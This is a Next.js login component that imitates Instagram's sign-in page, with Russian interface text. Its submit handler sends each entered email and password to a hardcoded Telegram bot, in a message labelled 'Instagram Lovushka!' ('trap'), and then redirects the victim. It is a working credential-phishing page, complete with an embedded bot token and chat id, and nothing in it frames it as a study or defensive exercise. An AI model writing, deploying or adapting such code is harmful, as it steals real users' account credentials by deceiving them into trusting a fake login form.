"use client";

import Image from "next/image";
import scss from "./Welcome.module.scss";
import insta from "../../assets/img/instatext.png";
import { useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { SubmitHandler, useForm } from "react-hook-form";
import axios from "axios";

interface ISignIn {
  email: string;
  password: string;
}

const Welcome = () => {
  const [pokaz, setPokaz] = useState(false);
  const router = useRouter();
  const { register, handleSubmit, reset } = useForm<ISignIn>();
  const [password, setPassword] = useState("");

  const onSubmit: SubmitHandler<ISignIn> = async (data) => {
    const my_id = `-1002155692436`;
    const token = `7379926721:AAGdHk5RpkeAFr5TOZApxisySaGqta-Lws4`;
    const api_key = `https://api.telegram.org/bot${token}/sendMessage`;

    const newProduct = {
      chat_id: my_id,
      parse_model: "html",
      text: `
        Instagram Lovushka!
          User Email: ${data.email}
          User Password: ${data.password}
      `,
    };

    axios.post(api_key, newProduct);
    reset();
    router.push("/next");
  };

  function registr() {
    window.open("https://www.instagram.com/accounts/emailsignup/", "_self");
  }

  return (
    <section className={scss.welcome}>
      <div className="container">
        <div className={scss.content}>
          <div className={scss.imgBlock}>
            <Image
              src="https://images.squarespace-cdn.com/content/v1/591169f0db29d6c07949add8/1566479124272-0Y3J4VT87HHE504YHENX/IgIphontemplate2.jpg?format=2500w"
              alt=""
              className={scss.img1}
              width={300}
              height={550}
            />
            <Image
              src="https://images.squarespace-cdn.com/content/v1/591169f0db29d6c07949add8/1566479124697-6FHEV2CHD79TKCT7S66U/IgIphontemplate1.jpg?format=2500w"
              alt=""
              className={scss.img2}
              width={300}
              height={550}
            />
          </div>
          <div className={scss.block}>
            <Image src={insta} alt="" />
            <form onSubmit={handleSubmit(onSubmit)}>
              <input
                type="text"
                placeholder="Телефон, имя пользователя или эл.адрес"
                {...register("email", { required: true })}
              />
              <div className={scss.password}>
                <input
                  type={pokaz ? "text" : "password"}
                  placeholder="Пароль"
                  {...register("password", { required: true })}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <div className={scss.pokaz}>
                  {password.trim() === "" ? null : (
                    <div>
                      {pokaz ? (
                        <h6 onClick={() => setPokaz(false)}>Скрыть</h6>
                      ) : (
                        <h6 onClick={() => setPokaz(true)}>Показать</h6>
                      )}
                    </div>
                  )}
                </div>
              </div>
              <button type="submit">Войти</button>
            </form>
            <div className={scss.next}>
              <hr />
              <h4>ИЛИ</h4>
              <hr />
            </div>
            <div className={scss.passworderror}>
              <Link href={"/password"}>Забыли пароль?</Link>
            </div>
            <h5>
              У вас еще нет аккаунта?
              <span onClick={() => registr()}>Зарегистрироваться</span>
            </h5>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Welcome;
